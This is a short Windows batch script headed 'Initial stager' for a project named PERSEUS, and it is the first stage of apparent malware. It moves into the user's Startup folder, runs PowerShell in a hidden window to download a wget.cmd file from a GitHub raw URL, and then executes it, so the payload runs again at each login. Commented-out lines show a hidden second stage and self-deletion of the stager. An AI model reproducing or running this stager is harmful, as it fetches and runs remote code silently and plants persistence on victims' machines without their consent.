@echo off
@REM Initial stager
@REM PERSEUS

@REM variables
set "INITIAL_PATH=C:/Users/Juan/Desktop/Perseus"
set "STARTUP=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
@REM Enter startup directory
cd %STARTUP%
@REM Begin the Stage 2

@REM Write payload to Startup
powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Kuper-xx/Perseus/refs/heads/main/files/wget.cmd' -Outfile 'wget.cmd'"


@REM Run payload
@REM powershell Start-Process cmd.exe -windowstyle hidden "%STARTUP%/stage2.cmd"
powershell "./wget.cmd"
cd %INITIAL_PATH%
@REM del initial.cmd